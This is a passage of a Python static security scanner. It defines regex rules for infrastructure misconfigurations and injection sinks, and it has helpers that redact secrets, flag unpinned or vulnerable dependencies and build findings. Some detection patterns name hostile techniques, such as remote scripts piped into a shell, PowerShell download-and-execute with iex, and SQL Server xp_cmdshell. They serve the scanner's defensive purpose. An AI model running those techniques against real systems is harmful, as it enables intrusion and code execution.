          (("yaml", r"""(?mi)^\s*(?:-\s*ALL\s*$|add\s*:\s*\[\s*["']?ALL)"""),
           ("kubernetes", r"""(?mi)^\s*(?:-\s*ALL\s*$|add\s*:\s*\[\s*["']?ALL)""")),
          "The container is granted every Linux capability.", confidence="MEDIUM", max_per_file=10,
          context=r"""(?mi)^\s*(?:cap_add|capabilities)\s*:"""),

    # ----------------------------------------------------------- Terraform --
    _rule("tf-public-bucket", "iac_misconfiguration", "Storage made public",
          (("terraform", r"""(?mi)^\s*acl\s*=\s*["'](?:public-read|public-read-write|website)["']"""),
           ("terraform", r"""(?mi)^\s*(?:publicly_accessible|publiclyAccessible)\s*=\s*true"""),
           ("terraform", r"""(?mi)^\s*block_public_acls\s*=\s*false""")),
          "A bucket or database is declared publicly accessible or without public-access blocks.",
          confidence="HIGH"),
    _rule("tf-open-cidr", "iac_misconfiguration", "Management port open to the internet",
          (("terraform", r"""(?mi)cidr_blocks\s*=\s*\[\s*["']0\.0\.0\.0/0["']"""),
           ("terraform", r"""(?m)^\s*from_port\s*=\s*(?:22|3389|5432|3306|6379|27017)\s*$"""),
           ("yaml", r"""(?mi)cidr\s*:\s*["']?0\.0\.0\.0/0"""),
           ("kubernetes", r"""(?mi)cidr\s*:\s*["']?0\.0\.0\.0/0""")),
          "A security group or firewall rule admits every source address.",
          confidence="HIGH"),
    _rule("tf-no-encryption", "iac_misconfiguration", "Encryption at rest disabled",
          (("terraform", r"""(?mi)^\s*(?:encrypted|storage_encrypted|encryption_at_rest)\s*=\s*false"""),
           ("terraform", r"""(?ms)versioning\s*\{[^}]*enabled\s*=\s*false""")),
          "Storage or a database is declared without encryption or without versioning.",
          confidence="HIGH"),

    # -------------------------------------------------------------- CI/CD --
    _rule("ci-write-all", "cicd_permissions", "Workflow grants write-all permissions",
          (("github-actions", r"""(?mi)^\s*permissions\s*:\s*write-all\s*$"""),
           ("yaml", r"""(?mi)^\s*permissions\s*:\s*write-all\s*$""")),
          "Every scope in the repository token is writable, so any step in the job can push, "
          "publish or alter releases.", confidence="HIGH"),
    _rule("ci-unpinned-action", "cicd_permissions", "Third-party action not pinned by SHA",
          (("github-actions", r"""(?mi)^\s*-?\s*uses\s*:\s*(?!actions/|github/)[\w.-]+/[\w.-]+@"""
                             r"""(?:main|master|v?\d+(?:\.\d+)*)\s*$"""),),
          "An action is referenced by a mutable tag or branch, so the publisher (or an attacker "
          "who compromises them) can change what runs in your pipeline.",
          severity="Medium", confidence="HIGH", max_per_file=20),
    _rule("ci-pull-request-target", "cicd_permissions", "pull_request_target with head checkout",
          (("github-actions", r"""(?ms)pull_request_target[\s\S]{0,600}?ref\s*:\s*\$\{\{\s*"""
                             r"""github\.event\.pull_request\.head"""),),
          "A privileged workflow event runs code from the pull request, exposing repository "
          "secrets and the write token.", confidence="HIGH"),
    _rule("ci-secret-echo", "cicd_permissions", "Secret printed in a workflow step",
          (("github-actions", r"""(?mi)^\s*(?:-\s*)?run\s*:.*\$\{\{\s*secrets\.""")
           , ("yaml", r"""(?mi)^\s*(?:-\s*)?run\s*:.*\$\{\{\s*secrets\.""")),
          "A secret is echoed into the job log, which is retained and often readable by more "
          "people than the secret itself.", confidence="HIGH", max_per_file=10),

    # ------------------------------------------------- Rust / C / C++ / Swift -- #
    # These languages were inventoried and then skipped: the table stopped at the
    # application languages the fixture corpus happened to use. Each rule below
    # names the one sink the language makes dangerous and reuses the existing
    # category vocabulary, so no new taxonomy entry is needed. Where a language
    # has no request-derived source the engines recognise, the pattern itself
    # demands a variable argument, which is why it is not marked ``needs_source``.
    _rule("rust-command-shell", "command_injection", "Subprocess started through a shell",
          (("rust", r"""Command\s*::\s*new\s*\(\s*["'](?:sh|bash|/bin/sh|/bin/bash|cmd(?:\.exe)?)["']"""),),
          "A subprocess goes through a shell, so every argument it receives is re-parsed as shell "
          "syntax.", severity="Medium", confidence="MEDIUM"),
    _rule("rust-sql-format", "sql_injection", "Query built with format!",
          (("rust", r"""(?:query|query_as|query_row|query_scalar|execute|prepare)\s*\(\s*&?\s*"""
                   r"""format!\s*\("""),),
          "The statement is assembled with format!, so the interpolated values are part of the SQL "
          "syntax.", confidence="HIGH"),
    _rule("rust-path-traversal", "path_traversal", "Filesystem path built with format!",
          (("rust", r"""(?:File\s*::\s*(?:open|create)|fs\s*::\s*(?:read|write|read_to_string)|"""
                   r"""read_to_string)\s*\(\s*&?\s*format!\s*\("""),),
          "A path is interpolated and opened directly, so a value containing ../ escapes the "
          "intended directory.", severity="Medium", confidence="MEDIUM"),
    _rule("c-command-exec", "command_injection", "Shell started with a variable command",
          (("c", r"""\b(?:system|popen|execl|execlp|execv|execvp)\s*\(\s*[A-Za-z_]\w*"""),
           ("cpp", r"""\b(?:std\s*::\s*system|system|popen)\s*\(\s*[A-Za-z_]\w*""")),
          "A shell is started with a command that is not a literal, so the caller controls the "
          "shell syntax.", confidence="MEDIUM", max_per_file=10),
    _rule("c-weak-random-token", "weak_randomness", "Token built from rand()",
          (("c", r"""(?i)\b\w*(?:token|secret|session|nonce|otp|salt)\w*\s*=\s*(?:rand|random)\s*\("""),
           ("cpp", r"""(?i)\b\w*(?:token|secret|session|nonce|otp|salt)\w*\s*=\s*(?:rand|random)\s*\(""")),
          "rand()/random() is a predictable generator with a small state, so a token or session "
          "identifier built from it can be guessed.", confidence="HIGH", max_per_file=10),
    _rule("swift-command-shell", "command_injection", "Process or NSTask run through a shell",
          (("swift", r"""(?:launchPath|executableURL)\s*=\s*(?:URL\s*\(\s*fileURLWithPath\s*:\s*)?"""
                     r"""["']/(?:bin/)?(?:sh|bash|zsh)["']"""),),
          "A shell is launched as the executable, so the arguments it is given are evaluated as "
          "shell syntax.", severity="Medium", confidence="MEDIUM"),
    _rule("swift-sql-interpolation", "sql_injection", "SQL string built by interpolation",
          (("swift", r"""(?:execute|query|prepare)\s*\(\s*"[^"\n]*\\\("""),),
          "A statement or query is built with Swift string interpolation instead of bound "
          "parameters.", confidence="HIGH"),
    _rule("sql-xp-cmdshell", "command_injection", "SQL Server shell escape invoked",
          (("sql", r"""(?i)\bEXEC(?:UTE)?\s+(?:master\s*\.\s*\.\s*)?xp_cmdshell\b"""),),
          "xp_cmdshell runs operating-system commands from SQL, so any injection into a statement "
          "that reaches it is remote code execution. Merely querying the xp_cmdshell setting is "
          "not this finding.", severity="High", confidence="HIGH", max_per_file=5),

    # ------------------------------------------------- Shell and PowerShell -- #
    _rule("sh-eval-variable", "code_injection", "eval of a variable",
          (("shell", r"""(?m)^[^#\n]*\beval\b[^\n]*\$"""),),
          "eval re-parses its argument, so a value that reaches it becomes code.",
          confidence="HIGH", max_per_file=10),
    _rule("sh-curl-pipe-shell", "code_injection", "Remote script piped into a shell",
          (("shell", r"""(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|k)?sh\b"""),
           ("dockerfile", r"""(?mi)^\s*RUN\b[^\n]*(?:curl|wget)\b[^|\n]*\|\s*(?:ba)?sh\b""")),
          "Content fetched over the network is executed without an integrity check, so whoever "
          "controls the URL controls the code that runs.", confidence="HIGH", max_per_file=10),
    _rule("sh-predictable-temp", "race_condition", "Predictable temporary path",
          (("shell", r"""(?m)(?:>|mktemp\s+-u)[^\n]*/tmp/[A-Za-z0-9_.-]+\b(?!\$)"""),),
          "A fixed path under /tmp is written without creating it exclusively, so another local "
          "process can pre-create or swap it.", severity="Medium", confidence="LOW",
          max_per_file=5),
    _rule("ps-invoke-expression", "code_injection", "Invoke-Expression on a variable",
          (("powershell", r"""(?i)\bInvoke-Expression\b[^\n]*\$|\biex\s*\(?\s*\$"""),),
          "Invoke-Expression executes its argument as PowerShell, so any value that reaches it "
          "becomes code.", confidence="HIGH", max_per_file=10),
    _rule("ps-download-execute", "code_injection", "Downloaded script executed in place",
          (("powershell", r"""(?i)(?:DownloadString|DownloadData|Invoke-WebRequest|iwr)\b[^\n]*\|"""
                          r"""\s*(?:Invoke-Expression|iex)\b"""),),
          "A remote script is piped straight into the interpreter, so the code that runs is chosen "
          "by whoever answers the request.", confidence="HIGH", max_per_file=10),

    # ---------------------------------------------- CloudFormation / Ansible -- #
    # Keyed on ``iac`` rather than ``yaml``/``json`` on purpose. The inventory
    # labels an infrastructure file by its *language*, and a yaml file under an
    # ``ansible/`` or ``k8s/`` directory is labelled ``kubernetes`` -- so a rule
    # tied to one label silently skips the others, which is how a CloudFormation
    # template could sit in the corpus and match nothing at all.
    _rule("cfn-public-access", "iac_misconfiguration", "Storage or snapshot made public",
          (("iac", r"""(?mi)^\s*["']?(?:AccessControl|access_control)["']?\s*:\s*["']?"""
                    r"""(?:PublicReadWrite|PublicRead|public-read-write|public-read|publicRead)"""),),
          "The template grants public access at the resource level, so the objects are readable (or "
          "writable) by anyone with the URL.", confidence="HIGH"),
    _rule("cfn-open-ingress", "iac_misconfiguration", "Security group open to the internet",
          (("iac", r"""(?mi)["']?(?:CidrIp|CidrIpv6)["']?\s*:\s*["']?(?:0\.0\.0\.0/0|::/0)"""),),
          "An ingress rule admits every source address.", confidence="HIGH"),
    _rule("cfn-wildcard-iam", "iac_misconfiguration", "IAM policy allows every action",
          (("iac", r"""(?ms)["']?Effect["']?\s*:\s*["']?Allow["']?[\s\S]{0,300}?"""
                    r"""["']?Action["']?\s*:\s*\[?\s*["']?\*"""),),
          "The policy statement allows every action, so a principal holding it is effectively an "
          "administrator.", confidence="HIGH", max_per_file=10),
    _rule("cfn-no-encryption", "iac_misconfiguration", "Encryption explicitly disabled",
          (("iac", r"""(?mi)^\s*["']?(?:StorageEncrypted|Encrypted|Encryption)["']?\s*:\s*"""
                    r"""["']?false"""),),
          "The resource is declared without encryption at rest.", confidence="HIGH"),
    _rule("ansible-no-cert-check", "tls_verification_disabled", "TLS verification disabled",
          (("iac", r"""(?mi)^\s*validate_certs\s*:\s*(?:no|false)\s*$"""),),
          "The task accepts any certificate, so an attacker on the path can impersonate the "
          "server.", confidence="HIGH"),
    _rule("ansible-templated-command", "command_injection", "Command module fed a template",
          (("iac", r"""(?mi)^\s*(?:shell|command|raw)\s*:\s*[^\n]*\{\{"""),),
          "The command is assembled from a variable at run time, so the value becomes part of the "
          "command line.", severity="Medium", confidence="MEDIUM", max_per_file=10),
    _rule("ansible-world-writable", "iac_misconfiguration", "World-writable file mode",
          (("iac", r"""(?mi)^\s*mode\s*:\s*["']?0?777["']?\s*$"""),),
          "A file or directory is created world-writable, so any local user can modify it.",
          severity="Medium", confidence="HIGH"),

    # ------------------------------------------------- Compose / Helm / CI ---- #
    _rule("compose-docker-socket", "container_security", "Docker socket mounted into a container",
          (("iac", r"""(?m)^\s*-\s*["']?/var/run/docker\.sock"""),),
          "Mounting the daemon socket gives the container control of the host's Docker, which is "
          "equivalent to root on that host.", confidence="HIGH"),
    _rule("compose-host-network", "container_security", "Container shares the host network",
          (("iac", r"""(?mi)^\s*network_mode\s*:\s*["']?host"""),),
          "The container has no network isolation, so it can reach host-only services and bind "
          "privileged ports.", severity="Medium", confidence="HIGH"),
    _rule("iac-floating-image", "container_security", "Image tag is latest or absent",
          (("iac", r"""(?mi)^\s*image\s*:\s*["']?[\w.\-/]+:latest["']?\s*$"""),),
          "A floating tag means the deployed image can change without a change to the manifest, so "
          "the same commit can run different code tomorrow.", severity="Low",
          confidence="HIGH", max_per_file=10),
    _rule("gitlab-ci-shell-pipe", "cicd_permissions", "Remote script piped into a shell in CI",
          (("iac", r"""(?mi)^\s*-?\s*(?:-\s*)?(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba)?sh\b"""),),
          "A pipeline step executes content fetched at run time, so a compromised or spoofed "
          "endpoint runs code with the runner's credentials.", confidence="HIGH", max_per_file=10),
    _rule("jenkins-shell-pipe", "cicd_permissions", "Remote script piped into a shell in a job",
          (("iac", r"""(?m)\bsh\s*\(?\s*["'][^"'\n]*(?:curl|wget)\b[^"'\n]*\|\s*(?:ba)?sh"""),),
          "The build executes content fetched at run time with the agent's credentials.",
          confidence="HIGH", max_per_file=10),
    _rule("tf-wildcard-iam", "iac_misconfiguration", "IAM policy allows every action",
          (("terraform", r'''(?ms)actions\s*=\s*\[\s*"\*"\s*\][\s\S]{0,200}?resources\s*=\s*\[?\s*"\*"'''),),
          "The policy grants every action on every resource.", confidence="HIGH"),
]

RULES.extend(CONFIG_RULES)


# --------------------------------------------------------------------------- #
# Engine helpers
# --------------------------------------------------------------------------- #
SEVERITIES = ("Critical", "High", "Medium", "Low", "Informational")
SEVERITY_RANK = {name: index for index, name in enumerate(SEVERITIES)}
PRIORITY_BY_SEVERITY = {"Critical": "P0", "High": "P1", "Medium": "P2",
                        "Low": "P3", "Informational": "P3"}


def _priority(severity: str, confidence: str) -> str:
    """Priority is severity adjusted by how sure we are.

    A Low-severity finding that is CONFIRMED can outrank a High-severity guess,
    so a reviewer is never told to chase speculation ahead of something real.
    """
    rank = SEVERITY_RANK.get(severity, len(SEVERITIES))
    if confidence == "CONFIRMED":
        rank -= 1
    elif confidence == "LOW":
        rank += 1
    rank = max(0, min(rank, len(SEVERITIES) - 1))
    return PRIORITY_BY_SEVERITY[SEVERITIES[rank]]


def _language_matches(language: Optional[str], bucket: Optional[str], wanted: str) -> bool:
    if wanted == "*":
        return True
    if wanted == "iac":
        return bucket == "iac" or language in IAC_LANGUAGES
    if wanted == "config":
        return bucket == "config" or language in CONFIG_LANGUAGES
    return language == wanted


def _line_index(text: str) -> List[int]:
    """Offsets at which each line starts, so a match offset maps to a line number."""
    starts = [0]
    for match in re.finditer("\n", text):
        starts.append(match.end())
    return starts


def _line_of(starts: Sequence[int], offset: int) -> int:
    import bisect
    return bisect.bisect_right(starts, offset)


def _match_line(text: str, starts: Sequence[int], match: Any) -> int:
    """Line of the first content a match *contains*, not the offset it starts at.

    Several rules anchor on ``^\\s*`` so they tolerate indentation. ``\\s`` also
    matches a newline, so such a match can begin on an earlier line that holds
    nothing but whitespace. Reporting that line points a reader at an indented
    line or a blanked docstring instead of the code the rule matched.
    """
    for position in range(match.start(), match.end()):
        if not text[position].isspace():
            return _line_of(starts, position)
    return _line_of(starts, match.start())


def _shape_replacement(match: Any, marker: str = "SECRET") -> str:
    """Replace one captured credential with the marker for its shape.

    The replacement itself lives in :func:`finding_model.redact_shape_match`, so
    the analyzer, the validator and the orchestrator spell a marker the same way;
    *marker* is the shape's word from :data:`SECRET_PATTERNS`. A pattern either
    names the value (``?P<secret>``) or matches it whole, so an assignment keeps
    its name and loses only the literal, and a URL keeps its scheme, user and
    host. Placeholders and existing markers are left alone.
    """
    return fm.redact_shape_match(match, marker)


def redact_shapes(text: str) -> str:
    """Replace every credential shape in *text* with a safe marker.

    Redacting only the value a rule matched is not enough for evidence: an
    excerpt quotes the neighbouring line too, so a token sitting beside an
    unrelated finding would otherwise be published with it. Every shape the
    secret pass can detect is swept, because those are exactly the shapes that
    can turn up in an excerpt.
    """
    if not text or not isinstance(text, str):
        return text
    for _secret_id, pattern_text, _label, marker in SECRET_PATTERNS:
        try:
            compiled = re.compile(pattern_text)
        except re.error:
            continue
        text = compiled.sub(
            lambda match, _marker=marker: _shape_replacement(match, _marker), text)
    return text


def _evidence(lines: Sequence[str], line_no: int, *, redact: Optional[Iterable[str]] = None,
              span: int = 1) -> str:
    """Numbered excerpt around ``line_no``; secrets are replaced before it is built."""
    first = max(1, line_no - span)
    last = min(len(lines), line_no + span)
    parts = []
    for number in range(first, last + 1):
        text = lines[number - 1]
        if len(text) > 400:
            text = text[:400] + " …"
        parts.append(f"{number:>5} | {text}")
    # Shapes first: a credential the sweep recognises gets its shape marker
    # everywhere, so quoting the same window twice cannot re-spell it. The
    # known-value pass then catches a secret with no recognisable shape.
    excerpt = redact_shapes("\n".join(parts[:MAX_EVIDENCE_LINES]))
    if redact:
        excerpt, _ = fm.redact_text(excerpt, redact)
    return excerpt[:MAX_EVIDENCE_CHARS]


def _tainted_names(text: str) -> Set[str]:
    """Local variables assigned from a request object anywhere in the file."""
    return {match.group(1) for match in TAINT_ASSIGN_RE.finditer(text)}


def _has_source(matched: str, line: str, tainted: Set[str]) -> bool:
    if SOURCE_RE.search(matched) or SOURCE_RE.search(line):
        return True
    words = set(re.findall(r"[A-Za-z_$][\w$]*", matched))
    return bool(words & tainted)


def _guard_hit(line: str, rule: Dict[str, Any]) -> Optional[str]:
    for guard in rule["guards"]:
        if re.search(guard, line):
            return guard
    return None


def _context_hit(lines: Sequence[str], line_no: int, pattern: str, window: int) -> bool:
    """Does the anchor appear in the block this match's error handling guards?

    The search starts at the nearest preceding ``try:`` (or at ``window`` lines
    above when there is none), not at an arbitrary fixed offset: the question the
    anchor answers is "did the swallowed exception protect a security decision?",
    and only the guarded block can answer it. Looking further back would let an
    unrelated ``token`` or ``auth`` mentioned earlier in the function vouch for
    error handling that guards nothing.
    """
    first = max(1, line_no - window)
    for candidate in range(line_no - 1, first - 1, -1):
        if re.match(r"\s*try\s*:", lines[candidate - 1] if candidate <= len(lines) else ""):
            first = candidate
            break
    block = "\n".join(lines[first - 1:line_no])
    return re.search(pattern, block) is not None


#: Buckets the *code-rule* pass reads: everything that carries program or
#: deployment syntax, where an injection sink has meaning.
CODE_BUCKETS = frozenset({"source", "config", "iac", "manifest"})

#: Buckets the secret pass reads in addition to :data:`CODE_BUCKETS`. These are
#: prose: they are never run through the code rules, only through the credential
#: patterns, because a tutorial that quotes ``db.execute(f"...{id}")`` is
#: teaching, not shipping, while a token quoted in the same paragraph is live.
DOC_BUCKETS = frozenset({"docs"})

#: Every bucket that is read at all. ``binary`` and ``unreadable`` stay out, and
#: they are already counted in the inventory's coverage limitations.
SCANNED_BUCKETS = CODE_BUCKETS | DOC_BUCKETS

#: Files that *define* detection signatures rather than contain behaviour. Their
#: patterns are stored as string literals, so running the rules those literals
#: describe over the file reports the rules as findings -- a self-match by
#: construction. Both passes skip them and record a limitation: the code rules
#: would match their own pattern table, and the secret pass would match the
#: fabricated credentials that table is tested with.
SIGNATURE_FILES = frozenset({"builtin_analyzers.py", "validate_findings.py"})

#: Language recorded for a document the inventory could not classify.
DOC_LANGUAGE_FALLBACK = "text"

#: A documentation line that reads like an illustration rather than a leak.
#: Documentation legitimately shows ``api_key = "your-key-here"`` or
#: ``token=...``; reporting those would bury the one real credential sitting
#: beside them, so such a line is skipped in the document buckets only.
DOC_ILLUSTRATIVE_RE = re.compile(
    r"(?i)(?:\b(?:example|examples|sample|samples|placeholder|dummy|fake|fake[_-]?\w*|"
    r"redacted|changeme|change[_-]me|todo|fixme|invalid)\b|"
    r"<your[-_ ]|your[-_ ]?(?:key|token|secret|password|api[-_]?key)|"
    r"x{4,}|\.\.\.|\u2026)")

#: Secret shapes that are ambiguous in prose: a literal ``password = "..."`` or a
#: connection string may be a form sample rather than a live credential. They
#: are still reported in documents, at MEDIUM confidence instead of HIGH, and
#: provider-shaped tokens (``ghp_``, ``sk_live_``, ``AKIA``, a private key) stay
#: HIGH because no example needs a checksum-valid looking key.
AMBIGUOUS_IN_DOCUMENTS = frozenset({"generic-assignment", "connection-string"})


def _secret_pass(text: str, lines: Sequence[str], starts: Sequence[int], *,
                 rel: str, language: Optional[str],
                 document: bool) -> List[Tuple[Dict[str, Any], str]]:
    """Scan one file for credential shapes; return ``(finding, raw_value)`` pairs.

    The same patterns run over code and over prose, because a credential does not
    care where it was committed. ``document`` changes three things and nothing
    else: the title says where the value was found, the note explains why a
    published file is the worse place for it, and the two ambiguous shapes drop
    to MEDIUM confidence. The value is redacted before the finding is built, so
    the raw secret exists only in the returned tuple, which the caller uses to
    count redactions and never serialises.
    """
    found: List[Tuple[Dict[str, Any], str]] = []
    for secret_id, pattern_text, label, marker in SECRET_PATTERNS:
        try:
            compiled = re.compile(pattern_text)
        except re.error:
            continue
        for match in compiled.finditer(text):
            value = match.groupdict().get("secret") or match.group(0)
            value = value.strip().strip("'\"")
            if not value or SECRET_PLACEHOLDER_RE.match(value):
                continue
            if len(value) < 6:
                continue
            if any(token in value for token in ("${", "{{", "os.environ", "process.env",
                                                "getenv", "%s")):
                continue
            line_no = _line_of(starts, match.start())
            line_text = lines[line_no - 1] if 0 < line_no <= len(lines) else ""
            if document and DOC_ILLUSTRATIVE_RE.search(line_text):
                continue
            redacted = fm.shape_marker(marker)
            evidence = _evidence(lines, line_no, span=1).replace(value, redacted)
            confidence = ("MEDIUM" if document and secret_id in AMBIGUOUS_IN_DOCUMENTS
                          else "HIGH")
            note = (f"A {label} was found and redacted here ({redacted}). The value is not "
                    f"written to this report; retrieve it from the audited file to rotate it.")
            if document:
                note += (" The match is in documentation, which is shipped, mirrored and often "
                         "published: the credential is exposed to everyone who can read the "
                         "repository, not only to those who can read the code.")
            found.append((build_finding(
                {"id": f"secret-{secret_id}", "category": "hardcoded_secret",
                 "title": ("Hardcoded credential committed in documentation" if document
                           else "Hardcoded credential committed in source"),
                 "severity": "High", "confidence": confidence, "extra_references": ()},
                file=rel, line_start=line_no, line_end=line_no,
                evidence=evidence, language=language, note=note,
            ), value))
    return found


def build_finding(rule: Dict[str, Any], *, file: str, line_start: int, line_end: int,
                  evidence: str, language: Optional[str], note: Optional[str] = None,
                  title: Optional[str] = None, severity: Optional[str] = None,
                  confidence: Optional[str] = None, cwe: Optional[str] = None,
                  cwe_name: Optional[str] = None,
                  extra_references: Sequence[str] = (),
                  source_rule: Optional[str] = None) -> Dict[str, Any]:
    """Assemble one schema-shaped finding. ``id`` is assigned in a later pass."""
    meta = CATEGORY_META[rule["category"]]
    severity = severity or rule["severity"]
    confidence = confidence or rule["confidence"]
    description = meta["description"]
    if note:
        description = f"{description} {note}"
    return {
        "id": "",
        "title": title or rule["title"],
        "category": rule["category"],
        "severity": severity,
        "confidence": confidence,
        "validation_status": "unvalidated",
        "cwe": {"id": cwe or meta["cwe"], "name": cwe_name or meta.get("cwe_name")},
        "owasp": {
            "top10_2025": meta["owasp"],
            "api_2023": meta.get("api") or "not mapped",
            "asvs": "not mapped",
        },
        "cvss_vector": None,
        "cvss_score": None,
        "scoring": "unscored",
        "location": {"file": file, "line_start": int(line_start), "line_end": int(line_end)},
        "language": language or "unknown",
        "evidence": redact_shapes(evidence),
        "description": description,
        "impact": meta["impact"],
        "attack_scenario": meta["scenario"],
        "recommended_fix": meta["fix"],
        "references": list(meta["references"]) + list(rule["extra_references"]) +
                      list(extra_references),
        "sources": [{"tool": TOOL_NAME, "rule_id": source_rule or rule["id"], "raw_ref": None}],
        "priority": _priority(severity, confidence),
        "priority_factors": [
            f"severity: {severity}",
            f"confidence: {confidence}",
            "reachability not yet validated (stage 5)",
        ],
    }


# --------------------------------------------------------------------------- #
# Dependency analysis
# --------------------------------------------------------------------------- #
_MANIFEST_KINDS = {
    "requirements.txt": "pypi", "package.json": "npm", "composer.json": "packagist",
    "Gemfile": "rubygems", "go.mod": "go", "pom.xml": "maven",
}


def _version_tuple(text: str) -> Optional[Tuple[int, ...]]:
    match = re.search(r"(\d+(?:\.\d+)*)", str(text or ""))
    if not match:
        return None
    return tuple(int(part) for part in match.group(1).split("."))


def _below(version: str, ceiling: str) -> bool:
    have, want = _version_tuple(version), _version_tuple(ceiling)
    if have is None or want is None:
        return False
    length = max(len(have), len(want))
    return have + (0,) * (length - len(have)) < want + (0,) * (length - len(want))


def _declared_dependencies(rel: str, name: str, text: str,
                           ecosystem: str) -> Iterator[Tuple[str, str, int]]:
    """Yield ``(package, version_text, line_number)`` for one manifest."""
    if ecosystem == "pypi" and re.match(r"requirements.*\.txt$", name):
        for number, raw in enumerate(text.splitlines(), start=1):
            line = raw.strip()
            if not line or line.startswith(("#", "-", "git+", "http")):
                continue
            line = line.split(";")[0].strip()
            match = re.match(r"([A-Za-z0-9_.\-]+)(\[[^\]]*\])?\s*(.*)$", line)
            if match:
                yield match.group(1), match.group(3).strip(), number
    elif ecosystem == "npm" and name == "package.json":
        try:
            data = json.loads(text)
        except ValueError:
            return
        for section in ("dependencies", "devDependencies", "optionalDependencies"):
            deps = data.get(section) if isinstance(data, dict) else None
            if not isinstance(deps, dict):
                continue
            for package, version in deps.items():
                line = _find_line(text, str(package))
                yield package, str(version), line
    elif ecosystem == "packagist" and name == "composer.json":
        try:
            data = json.loads(text)
        except ValueError:
            return
        for section in ("require", "require-dev"):
            deps = data.get(section) if isinstance(data, dict) else None
            if not isinstance(deps, dict):
                continue
            for package, version in deps.items():
                yield package, str(version), _find_line(text, str(package))
    elif ecosystem == "rubygems" and name == "Gemfile":
        for number, raw in enumerate(text.splitlines(), start=1):
            match = re.search(r"""gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?""", raw)
            if match:
                yield match.group(1), (match.group(2) or ""), number
    elif ecosystem == "maven" and name == "pom.xml":
        for match in re.finditer(
                r"<dependency>(?:(?!</dependency>)[\s\S])*?</dependency>", text):
            block = match.group(0)
            group = re.search(r"<groupId>\s*([^<]+)\s*</groupId>", block)
            artifact = re.search(r"<artifactId>\s*([^<]+)\s*</artifactId>", block)
            version = re.search(r"<version>\s*([^<]+)\s*</version>", block)
            if group and artifact:
                line = text.count("\n", 0, match.start()) + 1
                yield (f"{group.group(1).strip()}:{artifact.group(1).strip()}",
                       version.group(1).strip() if version else "",
                       line + block[:block.find("<artifactId>")].count("\n"))
    elif ecosystem == "go" and name == "go.mod":
        in_block = False
        for number, raw in enumerate(text.splitlines(), start=1):
            line = raw.strip()
            if line.startswith("require ("):
                in_block = True
                continue
            if in_block and line == ")":
                in_block = False
                continue
            entry = line if in_block else (line[len("require "):] if line.startswith("require ") else "")
            if not entry or entry.startswith("//"):
                continue
            parts = entry.split()
            if len(parts) >= 2:
                yield parts[0], parts[1], number
    elif name.endswith(".csproj"):
        for match in re.finditer(r'PackageReference\s+Include="([^"]+)"(?:\s+Version="([^"]+)")?',
                                 text):
            yield match.group(1), (match.group(2) or ""), text.count("\n", 0, match.start()) + 1


def _find_line(text: str, needle: str) -> int:
    index = text.find(f'"{needle}"')
    if index < 0:
        return 1
    return text.count("\n", 0, index) + 1


def _is_pinned(version: str) -> bool:
    version = (version or "").strip()
    if version in ("", "*", "latest", "x", "any"):
        return False
    # A caret/tilde range or an unversioned spec is not a fixed version. `==`,
    # `~=`, `>=` with a lower bound are constraints, which is enough to be
    # reproducible-ish; only a bare name or a wildcard is unpinned.
    return bool(re.search(r"\d", version))


def analyze_dependencies(root: str, files: Sequence[Dict[str, Any]],
                         limitations: List[str]) -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    ecosystems: Dict[str, int] = {}
    manifests_seen = 0
    for entry in files:
        rel = entry["path"]
        name = os.path.basename(rel)
        ecosystem = _MANIFEST_KINDS.get(name)
        if not ecosystem and not name.endswith(".csproj"):
            continue
        ecosystem = ecosystem or "nuget"
        try:
            with open(os.path.join(root, rel), encoding="utf-8", errors="replace") as handle:
                text = handle.read(400_000)
        except OSError:
            limitations.append(f"manifest not readable: {rel}")
            continue
        manifests_seen += 1
        ecosystems[ecosystem] = ecosystems.get(ecosystem, 0) + 1
        unpinned = 0
        for package, version, line in _declared_dependencies(rel, name, text, ecosystem):
            if not _is_pinned(version) and unpinned < 30:
                unpinned += 1
                findings.append(build_finding(
                    {"id": "dependency-unpinned", "category": "unpinned_dependency",
                     "title": "Dependency declared without a fixed version",
                     "severity": "Low", "confidence": "HIGH", "extra_references": ()},
                    file=rel, line_start=line, line_end=line,
                    evidence=_evidence(text.splitlines(), line), language=ecosystem,
                    note=f"{package!r} is declared as {version or 'no version constraint'!r}, so "
                         f"each build can resolve a different release.",
                ))
            for advisory in KNOWN_VULNERABLE:
                if advisory["ecosystem"] != ecosystem:
                    continue
                if package.lower() != advisory["package"].lower():
                    continue
                if not _below(version, advisory["below"]):
                    continue
                findings.append(build_finding(
                    {"id": f"dependency-{advisory['cve']}", "category": "vulnerable_dependency",
                     "title": advisory["title"], "severity": "High", "confidence": "HIGH",
                     "extra_references": (advisory["url"],)},
                    file=rel, line_start=line, line_end=line,
                    evidence=_evidence(text.splitlines(), line), language=ecosystem,
                    cwe=advisory["cwe"],
                    note=f"{package} {version} is below the fixed version {advisory['below']} "
                         f"({advisory['cve']}). The curated advisory table is a subset; run a "
                         f"database-backed scanner for full coverage.",
                ))
    return findings, {"manifests_parsed": manifests_seen, "ecosystems": ecosystems}


# --------------------------------------------------------------------------- #
# Attack-surface derived findings
# --------------------------------------------------------------------------- #
RATE_LIMIT_RE = re.compile(
    r"(?i)rate[_\- ]?limit|throttl|slowapi|Limiter\(|rack-attack|RateLimiter|"
    r"express-rate-limit|ratelimit|login_?attempts|lockout|fail2ban"
)
SENSITIVE_PATH_RE = re.compile(
    r"(?i)(?:admin|internal|user|account|invoice|order|payment|export|key|token|"
    r"secret|billing|customer|tenant|debug|config)"
)
AUTH_PRONE_PATH_RE = re.compile(
    r"(?i)(?:login|signin|sign-in|signup|register|reset|forgot|password|otp|verify|token|"
    r"authenticate|session)"
)
ID_LOOKUP_RE = re.compile(
    r"find_by_id|findById|findByPk|find_by\(|\.get\(\s*(?:id|pk)|"
    r"find\(.*(?:id|Id)|select\(.*where.*id|first_or_404|get_object_or_404"
)
OWNERSHIP_RE = re.compile(
    r"(?i)current_user|currentUser|req\.user|request\.user|@AuthenticationPrincipal|"
    r"tenant|owner|user_id|userId|authorize|policy_scope|accessible_by"
)


def _file_text(root: str, rel: str, cache: Dict[str, str]) -> str:
    if rel not in cache:
        try:
            with open(os.path.join(root, rel), encoding="utf-8", errors="replace") as handle:
                cache[rel] = handle.read(400_000)
        except OSError:
            cache[rel] = ""
    return cache[rel]


def analyze_attack_surface(root: str, attack_surface: Dict[str, Any],
                           limitations: List[str]) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
